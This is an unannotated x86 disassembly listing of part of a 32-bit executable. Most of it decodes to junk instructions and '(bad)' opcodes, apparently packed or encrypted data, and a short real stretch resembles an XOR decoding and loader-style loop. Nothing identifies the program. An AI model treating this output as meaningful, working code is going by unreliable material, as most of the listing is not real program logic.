  415a79:	sub    edi,DWORD PTR [esi]
  415a7b:	repnz test eax,0x2fa3a46
  415a81:	out    dx,eax
  415a82:	xchg   ebp,eax
  415a83:	int3   
  415a84:	mov    cl,0xfb
  415a87:	arpl   bp,di
  415a89:	sub    BYTE PTR cs:[edi-0x5c],dl
  415a8d:	data16 loop 0x415a70
  415a90:	push   ds
  415a91:	mov    dh,dh
  415a93:	fist   DWORD PTR [edi]
  415a95:	fwait
  415a96:	mov    ch,0xd1
  415a98:	jecxz  0x415a29
  415a9a:	or     ah,BYTE PTR [ecx+ebx*4+0x63]
  415a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a9f:	paddsw mm4,QWORD PTR [eax-0x3f]
  415aa3:	pop    edi
  415aa4:	push   esi
  415aa5:	arpl   bp,bp
  415aa7:	ins    DWORD PTR es:[edi],dx
  415aa8:	sub    al,ch
  415aaa:	mov    bl,0x42
  415aac:	fcomp  st(4)
  415aae:	push   esp
  415aaf:	movmskps esi,xmm0
  415ab2:	xchg   edx,eax
  415ab3:	xchg   edx,eax
  415ab4:	fucom  st(6)
  415ab6:	ror    BYTE PTR [ebp+0x5b3dc8e],0x27
  415abd:	sub    ebp,esi
  415abf:	pop    edi
  415ac0:	addr16 mov ch,0xd
  415ac3:	cld    
  415ac4:	test   DWORD PTR [edx-0x15becc40],edi
  415aca:	pop    esp
  415acb:	sbb    eax,0xf62647e
  415ad0:	mov    ebp,0x951b5a27
  415ad5:	hlt    
  415ad6:	call   ecx
  415ad8:	call   0x6b9:0xecc66c69
  415adf:	leave  
  415ae0:	jp     0x415b27
  415ae2:	les    edi,FWORD PTR [eiz*4-0x23d6b2a1]
  415ae9:	mov    ch,0xce
  415aeb:	add    bl,BYTE PTR [edi-0x56]
  415aee:	ds in  al,0x1
  415af1:	outs   dx,DWORD PTR ds:[esi]
  415af2:	(bad)  
  415af3:	jl     0x415a80
  415af5:	cmp    BYTE PTR [esp+esi*8-0x6e50ce19],dh
  415afc:	mov    edi,0x237ccf63
  415b01:	(bad)  
  415b02:	std    
  415b03:	mov    eax,ds:0x8613be8c
  415b08:	sbb    esp,DWORD PTR [edi-0x1c07ef61]
  415b0e:	and    DWORD PTR [eax-0x3e],ebx
  415b11:	push   0xf42d11bf
  415b16:	xor    al,0x9
  415b18:	(bad)  
  415b19:	jmp    0x4ac73d42
  415b1e:	test   BYTE PTR ds:0x116c96c2,al
  415b24:	ja     0x415b32
  415b26:	in     al,dx
  415b27:	xchg   esp,eax
  415b28:	pop    eax
  415b29:	fsub   DWORD PTR [ebx]
  415b2b:	pop    edx
  415b2c:	lahf   
  415b2d:	sub    cl,BYTE PTR [eax]
  415b2f:	inc    ebp
  415b30:	sbb    eax,0xed119969
  415b35:	rcr    ch,1
  415b37:	pop    eax
  415b38:	mov    edx,DWORD PTR [ebp+0xc]
  415b3b:	xor    edx,esi
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0x436518bc
  415bea:	jmp    0x5262:0x61470d6e
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx+0x5d]
  415bf5:	or     BYTE PTR [ebp-0x480a9c93],cl
  415bfb:	sahf   
  415bfc:	inc    ebx
  415bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bfe:	mov    cl,0xed
  415c00:	ins    BYTE PTR es:[edi],dx
  415c01:	aad    0xda
  415c03:	lods   eax,DWORD PTR ds:[esi]
  415c04:	fst    QWORD PTR [edx+0x31516dc9]
  415c0a:	adc    al,0x9
  415c0c:	pop    esp
  415c0d:	ja     0x415c7d
  415c0f:	adc    esp,esi
  415c11:	jg     0x415bcb
  415c13:	mov    esp,0x2aea01ac
  415c18:	mov    edi,edx
  415c1a:	xchg   esi,eax
  415c1b:	dec    ecx
  415c1c:	sbb    BYTE PTR [ecx-0x2e8df1a],dh
  415c22:	mov    esp,0xd9c6ffea
  415c27:	xor    ch,BYTE PTR [ebx+0x20]
  415c2a:	leave  
  415c2b:	xchg   esp,eax
  415c2c:	ret    
  415c2d:	cmc    
  415c2e:	shl    DWORD PTR ss:[edi-0x64a51766],1
  415c35:	rcl    BYTE PTR [ecx+0x30e2f774],1
  415c3b:	push   edi
  415c3c:	ins    DWORD PTR es:[edi],dx
  415c3d:	stos   DWORD PTR es:[edi],eax
  415c3e:	ja     0x415bd8
  415c40:	(bad)
  415c43:	push   ecx
  415c44:	xchg   esp,eax
  415c45:	dec    esi
  415c46:	(bad)  
  415c47:	sar    al,1
  415c49:	ss test eax,0x4e112678
  415c4f:	aaa    
  415c50:	lock sbb ah,BYTE PTR [ebp+0x6]
  415c54:	push   edi
  415c55:	aam    0x5
  415c57:	retf   0x2b5d
  415c5a:	jge    0x415c7c
  415c5c:	mov    BYTE PTR [ecx+ebp*1-0x5b07be9b],ch
  415c63:	sub    al,0xca
  415c65:	inc    eax
  415c66:	mov    ah,cl
  415c68:	push   ebx
  415c69:	test   al,0xa2
  415c6b:	adc    eax,0x2b2cad12
  415c70:	fst    QWORD PTR [ecx-0x61]
  415c73:	ins    DWORD PTR es:[edi],dx
  415c74:	call   0x1a1e3aa1
  415c79:	or     al,0x8a
  415c7b:	xchg   esp,eax
  415c7c:	dec    ecx
  415c7d:	fcomp  QWORD PTR [ebp+0x7c10e798]
  415c83:	or     al,0x6d
  415c85:	push   0xf95aa5e8
  415c8a:	xchg   esi,eax
  415c8b:	jae    0x415c5d
  415c8d:	mov    dh,0x62
  415c8f:	rol    esp,cl
  415c91:	dec    ebx
  415c92:	push   eax
  415c93:	mov    edi,0x8aa4a592
  415c98:	jge    0x415c82
  415c9a:	adc    edx,DWORD PTR [edi+esi*8+0x33]
  415c9e:	inc    edi
  415c9f:	xchg   esi,eax
  415ca0:	sbb    ebp,DWORD PTR ds:0x980ccd4c
  415ca6:	jg     0x415c51
  415ca8:	imul   esp,DWORD PTR [edx-0x358349f1],0x9ce8af77
  415cb2:	ret    0x811a
  415cb5:	xlat   BYTE PTR ds:[ebx]
  415cb6:	push   ebx
  415cb7:	retf   
  415cb8:	outs   dx,DWORD PTR ds:[esi]
  415cb9:	xchg   edi,eax
  415cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cbb:	inc    edi
  415cbc:	cmp    ch,bl
  415cbe:	dec    ecx
  415cbf:	int    0x26
  415cc1:	fstp   st(2)
  415cc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc4:	mov    eax,ds:0xa4d7db43
  415cc9:	aad    0x2f
  415ccb:	rcr    DWORD PTR [ebx],0x9
  415cce:	xor    BYTE PTR [edi+0x44],bh
  415cd1:	sti    
  415cd2:	sub    dh,cl
  415cd4:	sahf   
  415cd5:	mov    dh,0xc3
  415cd7:	add    eax,0x151a8932
  415cdc:	xchg   edi,eax
  415cdd:	lock adc DWORD PTR [ebx-0x5d65d043],edx
  415ce4:	vaddps ymm5,ymm5,YMMWORD PTR [ebp+0x75]
  415ce9:	lahf   
  415cea:	imul   ebp,DWORD PTR ds:0x53e246a9,0x8ebad3d4
  415cf4:	add    eax,0x5be7021f
  415cf9:	or     edi,ebp
  415cfb:	out    0x6a,eax
  415cfd:	sbb    al,0xb1
  415cff:	jmp    0x1981ea3a
  415d04:	sub    edi,0x9d73527f
  415d0a:	mov    cl,0x6a
  415d0c:	popa   
  415d0d:	sbb    al,0xc7
  415d0f:	pop    ecx
  415d10:	and    eax,0x6ba4232a
  415d15:	pop    esp
  415d16:	add    eax,0xf42e411e
  415d1b:	es inc esp
  415d1d:	inc    edx
  415d1e:	retf   
  415d1f:	aam    0x3a
  415d21:	mov    ecx,ebx
  415d23:	pop    ds
  415d24:	(bad)  
  415d25:	lock push edi
  415d27:	stos   BYTE PTR es:[edi],al
  415d28:	or     DWORD PTR [ebx-0x10f4e635],ecx
  415d2e:	xchg   ebx,eax
  415d2f:	rep stos BYTE PTR es:[edi],al
  415d31:	cld    
  415d32:	pop    esp
  415d33:	xchg   edi,eax
  415d34:	mov    al,ds:0xbe5da894
  415d39:	jp     0x415d4b
  415d3b:	xchg   ebx,eax
  415d3c:	adc    al,0x36
  415d3e:	test   BYTE PTR [edi-0x27a62973],dl
  415d44:	add    ch,al
  415d46:	mov    edi,0xe0b3c886
  415d4b:	sub    bl,ah
  415d4d:	stc    
  415d4e:	(bad)  
  415d4f:	loope  0x415d8b
  415d51:	test   al,0xe6
  415d53:	mov    ebx,0x682e064d
  415d58:	test   DWORD PTR [eax-0x20],0xd6217842
  415d5f:	popa   
  415d60:	addr16 mov al,0x76
  415d63:	xchg   esp,eax
  415d64:	sbb    eax,0x200a862e
  415d69:	out    0xa,eax
  415d6b:	mov    ah,0xb1
  415d6d:	sbb    dh,BYTE PTR [edx-0x38]
  415d70:	ja     0x415d6c
  415d72:	sub    eax,0xbf59d717
  415d77:	mov    eax,ds:0x99b72301
  415d7c:	and    BYTE PTR [esi+ebp*8-0x523f4c8d],dl
  415d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d84:	xchg   ecx,eax
  415d85:	(bad)  [edi]
  415d87:	cli    
  415d88:	or     bl,BYTE PTR [ecx+ebp*1-0x4]
  415d8c:	push   esi
  415d8d:	pop    ebp
  415d8e:	mov    ebx,DWORD PTR [esi+0x4b]
  415d91:	adc    eax,DWORD PTR [eax+0xcd10c32]
  415d97:	jo     0x415d99
  415d99:	mov    esp,0x2d5ce6d1
  415d9e:	push   edx
  415d9f:	bound  esp,QWORD PTR [edx]
  415da1:	add    eax,0x40a93684
  415da6:	in     eax,dx
  415da7:	push   cs
  415da8:	int    0x5e
  415daa:	mov    edx,0x1462162b
  415daf:	fst    QWORD PTR [ebx+0x20]
  415db2:	xchg   ax,ax
  415db4:	ss sbb al,0xe8
  415db7:	aam    0xc8
  415db9:	push   ss
  415dba:	mov    cl,0xa9
  415dbc:	aas    
  415dbd:	data16 das 
  415dbf:	add    ch,BYTE PTR [esi+0x66]
  415dc2:	jnp    0x415df2
  415dc4:	dec    ebx
  415dc5:	xchg   edi,eax
  415dc6:	popa   
  415dc7:	and    ebp,edx
  415dc9:	es rcl DWORD PTR es:[ebp+edi*2-0x71a9927f],0x5f
  415dd3:	ins    BYTE PTR es:[edi],dx
  415dd4:	or     ebx,DWORD PTR [ecx-0x23]
  415dd7:	enter  0xa01,0xb7
  415ddb:	inc    ebx
  415ddc:	xchg   esp,eax
  415ddd:	leave  
  415dde:	inc    ebp
  415ddf:	in     al,dx
  415de0:	sub    DWORD PTR [esi-0x549d6256],esp
  415de6:	xchg   edi,eax
  415de7:	outs   dx,DWORD PTR ds:[esi]
  415de8:	mov    edi,0x5c07a64b
  415ded:	mov    eax,0xc4388a20
  415df2:	jmp    0x415db6
  415df4:	(bad)  
  415df5:	in     al,0xb
  415df7:	dec    eax
  415df8:	mov    edx,0xf906233b
  415dfd:	or     ebp,DWORD PTR [edi]
  415dff:	pop    eax
  415e00:	fidivr DWORD PTR ds:0x3cab417f
  415e06:	lea    ecx,[edx+0x25]
  415e09:	mov    edi,0x955934c0
  415e0e:	pop    edi
  415e0f:	int    0xef
  415e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e12:	loop   0x415e66
  415e14:	and    bl,dl
  415e16:	sbb    DWORD PTR [eax+0x13],edx
  415e19:	arpl   WORD PTR [ecx],bp
  415e1b:	xor    esi,DWORD PTR [edx]
  415e1d:	btc    DWORD PTR [esi+edi*2],ecx
  415e21:	sbb    al,cl
  415e23:	sahf   
  415e24:	das    
  415e25:	shld   DWORD PTR [eax],edx,cl
  415e28:	outs   dx,BYTE PTR ds:[esi]
  415e29:	xor    al,0x47
  415e2b:	pop    ecx
  415e2c:	mov    ebx,0xb9139555
  415e31:	mov    edi,0x8da44ebf
  415e36:	xor    dl,BYTE PTR [esi-0x19]
  415e39:	mov    dh,0xb9
  415e3b:	mov    ah,0x79
  415e3d:	xor    cl,ch
  415e3f:	cdq    
  415e40:	sub    eax,0x94841c4a
  415e45:	fimul  DWORD PTR [ebx]
  415e47:	cmp    dl,bl
  415e49:	cmp    eax,0xd6cbdc09
  415e4e:	ret    0x4220
  415e51:	das    
  415e52:	add    eax,0x2f082268
  415e57:	cmp    al,0x1f
  415e59:	add    BYTE PTR [ebp+0x55b205bb],0x48
  415e60:	mov    ebp,0xed7f554c
  415e65:	and    al,0x99
  415e67:	test   al,0xb7
  415e69:	jo     0x415e6b
  415e6b:	(bad)  
  415e6c:	(bad)  
  415e6e:	pop    ebp
  415e6f:	(bad)  
  415e70:	ins    BYTE PTR es:[edi],dx
  415e71:	outs   dx,DWORD PTR ds:[esi]
  415e72:	adc    DWORD PTR [eax-0x68191f1a],ecx
  415e78:	pop    esp
  415e79:	in     al,0xbe
  415e7b:	test   al,0x1f
  415e7d:	xchg   si,ax
  415e7f:	les    esi,FWORD PTR [edi]
  415e81:	inc    ecx
  415e82:	scas   al,BYTE PTR es:[edi]
  415e83:	dec    ebx
  415e84:	dec    DWORD PTR [ebp-0x50b1c8d8]
  415e8a:	dec    esi
  415e8b:	pop    es
  415e8c:	(bad)  
  415e8d:	test   eax,0x7f1ca6cd
  415e92:	mov    bh,dh
  415e94:	jbe    0x415f07
  415e96:	(bad)  
  415e97:	ficomp WORD PTR [edx-0x346eee22]
  415e9d:	call   0xaa9aae9c
  415ea2:	arpl   bx,si
  415ea4:	add    al,0xed
  415ea6:	cli    
  415ea7:	sbb    ah,BYTE PTR ss:[edi-0x74affb57]
  415eae:	or     al,0x53
  415eb0:	sbb    eax,0x6add6a1a
  415eb5:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  415eb7:	cli    
  415eb8:	dec    ecx
  415eb9:	sbb    ebx,DWORD PTR [eax+0x22077741]
  415ebf:	loope  0x415f2a
  415ec1:	jmp    0x160344b0
  415ec6:	retf   0x94b8
  415ec9:	cwde   
  415eca:	outs   dx,DWORD PTR ds:[esi]
  415ecb:	scas   al,BYTE PTR es:[edi]
  415ecc:	pop    edx
  415ecd:	dec    eax
  415ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ecf:	(bad)  
  415ed0:	retf   
  415ed1:	ret    
  415ed2:	ins    DWORD PTR es:[edi],dx
  415ed3:	push   ecx
  415ed4:	movaps xmm0,xmm3
  415ed7:	ins    DWORD PTR es:[edi],dx
  415ed8:	repz out dx,eax
  415eda:	in     eax,dx
  415edb:	mov    dh,0xcc
  415edd:	jecxz  0x415ea3
  415edf:	mov    dh,0xdb
  415ee1:	cli    
  415ee2:	push   esp
  415ee3:	pop    ebx
  415ee4:	sub    dl,al
  415ee6:	enter  0xcb13,0x41
  415eea:	jl     0x415f65
  415eec:	das    
  415eed:	repnz pop ebp
  415eef:	test   al,0xb8
  415ef1:	in     eax,dx
  415ef2:	mov    esi,0x54bd7710
  415ef7:	fistp  QWORD PTR fs:[esi-0x6147dd2f]
  415efe:	and    eax,0xc3a008a9
  415f03:	fwait
  415f04:	aad    0xa9
  415f06:	mov    bh,0x47
  415f08:	inc    esp
  415f09:	push   edx
  415f0a:	sub    esp,DWORD PTR [ebx]
  415f0c:	and    edi,DWORD PTR ss:[edx-0x4]
  415f10:	mov    dl,0x86
  415f12:	push   ebp
  415f13:	pop    ecx
  415f14:	mov    ds:0xed896f17,al
  415f19:	push   ds
  415f1a:	fisttp DWORD PTR [eax]
  415f1c:	in     eax,0xfe
  415f1e:	(bad)  
  415f1f:	imul   edi,DWORD PTR [edx+0x69fd0f61],0x523e81c3
  415f29:	neg    dh
  415f2b:	or     al,0x63
  415f2d:	call   0xf6e3:0xbe2fde25
  415f34:	retf   0xc594
  415f37:	mov    al,ds:0x44040f36
  415f3c:	pop    eax
  415f3d:	xchg   ecx,eax
  415f3e:	clc    
  415f3f:	xor    ah,BYTE PTR [ecx+0x25]
  415f42:	sbb    ah,BYTE PTR [ebx-0x4d]
  415f45:	rcr    DWORD PTR [eax+0x12],cl
  415f48:	add    BYTE PTR fs:[ecx+0x347f42af],al
  415f4f:	pop    ebp
  415f50:	lock dec edx
  415f52:	pop    ecx
  415f53:	jmp    0xc60f1055
  415f58:	daa    
  415f59:	mov    BYTE PTR [ebp+0x144f754],ah
  415f5f:	enter  0x981,0xe6
  415f63:	mov    WORD PTR [esi],?
  415f65:	clc    
  415f66:	sub    eax,0x69d687b
  415f6b:	mov    bh,0xfb
  415f6d:	nop
  415f6e:	lock inc esi
  415f70:	ja     0x415f76
  415f72:	mov    edi,0x91e55b2c
  415f77:	add    dl,cl
  415f79:	pusha  
  415f7a:	inc    esi
  415f7b:	xchg   DWORD PTR [ebp-0x79008ec0],ebp
  415f81:	(bad)  
  415f82:	xadd   bl,dh
  415f85:	outs   dx,DWORD PTR ds:[esi]
  415f86:	das    
  415f87:	pusha  
  415f88:	mov    ebp,0xa08cefd9
  415f8d:	jge    0x415f7f
  415f8f:	add    cl,BYTE PTR [edi-0x7f]
  415f92:	sub    ah,BYTE PTR [edx-0x40]
  415f95:	inc    ebp
  415f96:	cmc    
  415f97:	xchg   esp,eax
  415f98:	and    eax,0x9e8b3361
  415f9d:	jge    0x415f94
  415f9f:	cmp    eax,0x6718bd7f
  415fa4:	dec    esi
  415fa5:	std    
  415fa6:	sub    bh,BYTE PTR [edx+0xcefbd89]
  415fac:	xor    eax,0x6420b463
  415fb1:	sbb    bl,BYTE PTR [edx-0xd]
  415fb4:	stc    
  415fb5:	and    DWORD PTR [ebx-0x38c6d1e5],eax
  415fbb:	push   es
  415fbc:	xchg   esi,eax
  415fbd:	or     cl,BYTE PTR [esi+eax*2-0x9d9f9a2]
  415fc4:	jmp    0x2d66:0x31b64b04
  415fcb:	loopne 0x416029
  415fcd:	xor    eax,0xb76c9f06
  415fd2:	mov    esi,0x81b03efc
  415fd7:	jmp    0xaa952ce3
  415fdc:	pop    es
  415fdd:	adc    BYTE PTR [edx+0x497ab87b],0xda
  415fe4:	retf   0xcb4c
  415fe7:	xor    ah,BYTE PTR [ecx+0x4c]
  415fea:	pusha  
  415feb:	repz fstp TBYTE PTR [esi+0x168c98ad]
  415ff2:	xor    BYTE PTR [edi-0x2e],dl
  415ff5:	cmc    
  415ff6:	imul   ecx,DWORD PTR [edi+0x48],0x5293cc4c
  415ffd:	fcomi  st,st(4)
  415fff:	mov    cl,BYTE PTR [ebx+ebp*2]
  416002:	fisubr DWORD PTR [ecx+0x0]
  416005:	sub    al,0xf5
  416007:	jl     0x415ff2
  416009:	ds mov ah,0x94
  41600c:	test   al,0xa8
  41600e:	mov    esi,0x927185cf
  416013:	push   0xc56e639f
  416018:	jge    0x415ffd
  41601a:	push   ss
  41601b:	xor    DWORD PTR [edx],edi
  41601d:	cmove  ebx,edx
  416020:	mov    ds:0xf146c1a1,eax
  416025:	test   al,0xf
  416027:	xor    dl,BYTE PTR [ecx]
  416029:	push   esi
  41602a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41602b:	xor    DWORD PTR [eax],ebx
  41602d:	sbb    bh,BYTE PTR [edi+0x6]
  416030:	push   ss
  416031:	adc    DWORD PTR [edx-0x3fa4fa68],0xb2dc4af2
  41603b:	pushf  
  41603c:	sbb    DWORD PTR [ecx],esp
  41603e:	xchg   ebx,esp
  416040:	test   BYTE PTR [eax-0x417e0c98],ah
  416046:	mov    ds:0xffc401e0,al
  41604b:	sbb    eax,0x30a4772b
  416050:	xchg   ebp,eax
  416051:	adc    bl,bl
  416053:	xor    eax,0x58db409b
  416058:	sub    al,0xb5
  41605a:	ins    DWORD PTR es:[edi],dx
  41605b:	push   0xeb125285
  416060:	cmp    esp,ecx
  416062:	loopne 0x41609b
  416064:	jne    0x416053
  416066:	in     eax,dx
  416067:	push   0x6d
  416069:	out    dx,al
  41606a:	fistp  WORD PTR [edx-0x767f155a]
  416070:	in     eax,dx
  416071:	je     0x4160c1
  416073:	inc    edi
  416074:	jno    0x416059
  416076:	pop    ecx
  416077:	sbb    ebp,DWORD PTR es:[ebx-0x265a6835]
  41607e:	imul   edx,esp,0x2c5c5dda
  416084:	nop
  416085:	mov    BYTE PTR [esp+ebx*2],ah
  416088:	xor    al,0x8a
  41608a:	out    dx,al
  41608b:	jmp    0xb153:0xb655346
  416092:	cmp    ebp,edx
  416094:	push   0x75910a74
  416099:	ins    BYTE PTR es:[edi],dx
  41609a:	jne    0x416100
  41609c:	jle    0x416092
  41609e:	mov    esp,0x5cb713ca
  4160a3:	cld    
  4160a4:	mov    ebx,DWORD PTR [edx+0x1e]
  4160a7:	add    DWORD PTR [ebx-0x29],ebx
  4160aa:	cmp    ebp,esp
  4160ac:	and    al,0xae
  4160ae:	sub    BYTE PTR [esi],cl
  4160b0:	inc    ecx
  4160b1:	push   es
  4160b2:	jecxz  0x416117
  4160b4:	and    ah,bh
  4160b6:	xchg   al,bh
  4160b8:	call   0x32ad4b38
  4160bd:	xor    al,0xb5
  4160bf:	clc    
  4160c0:	icebp  
  4160c1:	xchg   esp,eax
  4160c2:	and    esp,DWORD PTR [ecx+0x2d]
  4160c5:	ret    0x7184
  4160c8:	mov    edx,0x14e1cbe1
  4160cd:	add    bl,0x25
  4160d0:	mov    eax,0xb6c972ae
  4160d5:	push   0xffffffd6
  4160d7:	or     BYTE PTR [eax],dl
  4160d9:	scas   eax,DWORD PTR es:[edi]
  4160da:	adc    ah,0x21
  4160dd:	mov    edx,0x54da7ee0
  4160e2:	aad    0x5e
  4160e4:	mov    ds:0xd9ef1234,al
  4160e9:	jnp    0x4160f6
  4160eb:	dec    ebp
  4160ec:	(bad)  
  4160ed:	rcr    BYTE PTR [edi-0x5c806234],cl
  4160f3:	xchg   BYTE PTR [edx-0x1a],al
  4160f6:	mov    edi,0x56cecb43
  4160fb:	std    
  4160fc:	clc    
  4160fd:	repnz iret 
  4160ff:	mov    dl,0x5
  416101:	inc    ecx
  416102:	xchg   edi,eax
  416103:	das    
  416104:	cli    
  416105:	jge    0x41608c
  416107:	sub    bl,BYTE PTR [edx+0x2]
  41610a:	cdq    
  41610b:	call   0x1a498bf0
  416110:	icebp  
  416111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416112:	ret    
  416113:	repnz mov esi,0xb2a3d4a5
  416119:	sub    bl,al
  41611b:	inc    ebx
  41611c:	jmp    0x478af198
  416121:	stc    
  416122:	aam    0x6f
  416124:	mov    eax,ds:0x63a8c671
  416129:	xchg   edi,eax
  41612a:	arpl   WORD PTR [ebx+0x4e00007c],bp
  416130:	or     esp,esp
  416132:	mov    cl,al
  416134:	fisubr WORD PTR [edx]
  416136:	sbb    BYTE PTR [ecx],bh
  416138:	push   cs
  416139:	mov    al,0xd
  41613b:	inc    edi
  41613c:	lahf   
  41613d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41613e:	jbe    0x416173
  416140:	or     ch,BYTE PTR [edx-0x5247876a]
  416146:	cdq    
  416147:	cwde   
  416148:	enter  0x6bb6,0x88
  41614c:	adc    esi,DWORD PTR [ecx+0x5c]
  41614f:	push   ecx
  416150:	add    eax,DWORD PTR [edi]
  416152:	add    DWORD PTR [esi+0x3b95e62b],ebx
  416158:	test   dh,0xb4
  41615b:	inc    edx
  41615c:	sbb    DWORD PTR [ecx-0x7b],edx
  41615f:	mov    eax,?
  416161:	cmp    eax,DWORD PTR [edi+0x13d7fa63]
  416167:	and    ebp,DWORD PTR [edx+0x557a5aca]
  41616d:	mov    esp,0xc3ff297e
  416172:	clc    
  416173:	push   ds
  416174:	retf   
  416175:	les    edi,FWORD PTR [edi]
  416177:	mov    ds:0xd31cd095,eax
  41617c:	cdq    
  41617d:	add    ebx,esp
  41617f:	mov    ecx,0x60428b89
  416184:	mov    ds:0x6f85756d,eax
  416189:	inc    edx
  41618a:	sahf   
  41618b:	mov    DWORD PTR [eax+0x66d7bb91],ebp
  416191:	loopne 0x416192
  416193:	cs add bh,bh
  416196:	inc    esp
  416197:	adc    al,0x5b
  416199:	xchg   ebx,eax
  41619a:	std    
  41619b:	ins    BYTE PTR es:[edi],dx
  41619c:	repz add WORD PTR [ecx-0x37],dx
  4161a1:	retf   0xa9e1
  4161a4:	cmp    eax,0x1f6dd7d3
  4161a9:	push   esi
  4161aa:	dec    eax
  4161ab:	call   0xac370499
  4161b0:	retf   
  4161b1:	lahf   
  4161b2:	test   al,0x1
  4161b4:	loopne 0x416161
  4161b6:	hlt    
  4161b7:	dec    ebx
  4161b8:	int    0x7c
  4161ba:	cmp    cl,BYTE PTR [edi]
  4161bc:	test   ebp,0xa5ec09e2
  4161c2:	fs mov dl,0x78
  4161c5:	and    al,0xf3
  4161c7:	les    ebx,FWORD PTR [ebx]
  4161c9:	mov    edi,0x7e809108
  4161ce:	rol    DWORD PTR [ebx-0x14b10df5],cl
  4161d4:	push   ds
  4161d5:	mov    ah,0xc6
  4161d7:	mov    esi,0x2c653786
  4161dc:	pop    eax
  4161dd:	sub    esp,DWORD PTR [esi]
  4161df:	gs push ebx
  4161e1:	add    al,0xfc
  4161e3:	repnz aad 0x70
  4161e6:	out    dx,eax
  4161e7:	dec    edx
  4161e8:	test   al,0x16
  4161ea:	aas    
  4161eb:	cs sahf 
  4161ed:	inc    ebp
  4161ee:	and    edx,DWORD PTR [edx-0x1a]
  4161f1:	loope  0x4161eb
  4161f3:	push   edx
  4161f4:	cmp    al,0x41
  4161f6:	push   cs
  4161f7:	fnstcw WORD PTR [edi+0x25]
  4161fa:	arpl   bx,dx
  4161fc:	shr    BYTE PTR [ebx+0x7c],1
  4161ff:	jae    0x4161c9
  416201:	mov    eax,ds:0x55e90c33
  416206:	add    DWORD PTR [ebx-0x5b],edi
  416209:	sti    
  41620a:	jnp    0x4161bc
  41620c:	push   edi
  41620d:	and    BYTE PTR [ebx],cl
  41620f:	adc    BYTE PTR [ebx+0x27],ah
  416212:	dec    edi
  416213:	enter  0xc79f,0xc3
  416217:	out    0xb7,al
  416219:	pushf  
  41621a:	xchg   dh,bl
  41621c:	jbe    0x4161c0
  41621e:	xchg   esp,eax
  41621f:	adc    eax,0xa6380a7d
  416224:	repz fsub st,st(0)
  416227:	sbb    al,0x5b
  416229:	and    al,dl
  41622b:	jle    0x416215
  41622d:	dec    edx
  41622e:	adc    edi,DWORD PTR [ebp+0x32]
  416231:	sbb    eax,DWORD PTR [edx+0x36201c8e]
  416237:	popa   
  416238:	popa   
  416239:	aam    0xe6
  41623b:	adc    al,0xeb
  41623d:	and    edi,edx
  41623f:	dec    edx
  416240:	sub    eax,0x21d9fdb3
  416245:	xchg   dl,bl
  416247:	pop    ss
  416248:	je     0x4162aa
  41624a:	mov    ds:0x67cb04a8,al
  41624f:	fldlg2 
  416251:	repz mov edx,0x41e81c1d
  416257:	mov    dh,0x36
  416259:	js     0x4161f6
  41625b:	cwde   
  41625c:	lahf   
  41625d:	pop    ebx
  41625e:	fisttp WORD PTR [ebp+0x35]
  416261:	call   0xe8a6:0x36eceb3a
  416268:	jb     0x416291
  41626a:	stos   BYTE PTR es:[edi],al
  41626b:	loope  0x41623e
  41626d:	and    al,0x3d
  41626f:	sub    DWORD PTR [edi-0x1],ebp
  416272:	rcl    esi,1
  416274:	adc    DWORD PTR [esi+0x52],edx
  416277:	mov    esi,0x7ad6415f
  41627c:	hlt    
  41627d:	sub    esp,DWORD PTR [edi+0x6a]
  416280:	or     BYTE PTR [esp+eax*1-0x3d],al
  416284:	xchg   bl,bl
  416286:	mov    ecx,0xea6cbe4d
  41628b:	loopne 0x416267
  41628d:	inc    esi
  41628e:	fdiv   QWORD PTR [esi+0x64e4868a]
  416294:	outs   dx,BYTE PTR ds:[esi]
  416295:	mov    bh,0x66
  416297:	sbb    ebx,DWORD PTR [ebp-0x39a3e19]
  41629d:	push   ecx
  41629e:	iret   
  41629f:	mov    dh,0x5f
  4162a1:	inc    esi
  4162a2:	iret   
  4162a3:	cmp    al,0xb5
  4162a5:	je     0x416288
  4162a7:	xor    eax,0x8dfcf1b2
  4162ac:	or     al,0xf
  4162ae:	cmp    DWORD PTR [ebp+0x2313575c],edx
  4162b4:	mov    dl,0x4e
  4162b6:	mov    al,ds:0x4c44eb84
